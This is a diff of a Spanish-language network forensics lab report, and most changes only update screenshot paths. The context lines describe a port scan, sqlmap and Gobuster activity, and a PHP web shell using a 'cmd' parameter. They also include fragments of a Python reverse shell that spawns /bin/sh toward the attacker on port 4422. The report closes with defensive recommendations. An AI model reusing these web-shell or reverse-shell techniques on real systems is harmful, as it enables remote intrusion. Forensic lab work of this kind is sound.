@@ -41,11 +41,11 @@ tcp.flags.syn == 1 && tcp.flags.ack == 0
 
 La IP `10.251.96.4` generó más de 16,000 paquetes SYN hacia `10.251.96.5`. El análisis de los flags TCP reveló el patrón **SYN → SYN-ACK → ACK**, confirmando que el atacante completó el three-way handshake en cada puerto — esto corresponde a un **TCP Connect Scan (-sT de Nmap)**.
 
-![Port Scan] LAB03/evidencia/Captura de pantalla 2026-03-31 175517.png
+![Port Scan](./evidencia/Captura%20de%20pantalla%202026-03-31%20175517.png)
 
 **Rango de puertos escaneados:** 1 – 1024 (puertos well-known)
 
-![Rango de puertos](capturas/02_rango_puertos.png)
+![Rango de puertos](./evidencia/Captura%20de%20pantalla%202026-03-31%20180007.png)
 
 ---
 
@@ -60,12 +60,12 @@ ip.src == 10.251.96.4 && !(http.user_agent contains "sqlmap") && !(http.user_age
 **Herramienta 1 — sqlmap 1.4.7**  
 Usado para reconocimiento y explotación de SQL Injection contra la aplicación web.
 
-![sqlmap](capturas/03_sqlmap.png)
+![sqlmap](./evidencia/Captura%20de%20pantalla%202026-03-31%20180220.png)
 
 **Herramienta 2 — Gobuster 3.0.1**  
 Usado para fuzzing de directorios y archivos en el servidor web.
 
-![Gobuster](capturas/04_gobuster.png)
+![Gobuster](./evidencia/Captura%20de%20pantalla%202026-03-31%20180341.png)
 
 ---
 
@@ -93,7 +93,7 @@ if(isset($_REQUEST['cmd'])){
 
 El parámetro utilizado para ejecutar comandos es **`cmd`**.
 
-![Web Shell Upload](capturas/05_webshell_upload.png)
+![Web Shell Upload](./evidencia/Captura%20de%20pantalla%202026-03-31%20180611.png)
 
 ---
 
@@ -116,7 +116,7 @@ p=subprocess.call(["/bin/sh","-i"]);'
 - **Puerto utilizado:** 4422
 - **Dirección de la conexión:** Víctima (10.251.96.5) → Atacante (10.251.96.4)
 
-![Reverse Shell](capturas/06_reverse_shell.png)
+![Reverse Shell](./evidencia/Captura%20de%20pantalla%202026-03-31%20182136.png)
 
 ---
 
@@ -168,4 +168,3 @@ p=subprocess.call(["/bin/sh","-i"]);'
 - Restringir los directorios de subida para que no sean ejecutables
 - Monitorear conexiones salientes en puertos no estándar como 4422
 - El filtro `!(contains "X") && !(contains "Y")` en Wireshark es más eficiente para descubrir herramientas desconocidas que buscar nombre por nombre
-
